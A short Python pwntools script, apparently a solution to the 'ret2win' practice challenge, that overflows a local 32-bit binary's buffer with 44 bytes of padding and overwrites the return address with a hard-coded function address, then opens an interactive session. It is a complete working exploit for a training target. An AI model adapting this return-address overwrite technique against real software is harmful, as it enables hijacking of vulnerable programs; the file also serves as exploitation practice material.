#!/usr/bin/python3.7
import pwn

ret2win_addr = 0x08048659
payload = ('D'*40).encode()
payload += ('B'*4).encode()
payload += pwn.p32(ret2win_addr)

p = pwn.tubes.process.process(["./ret2win32"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()

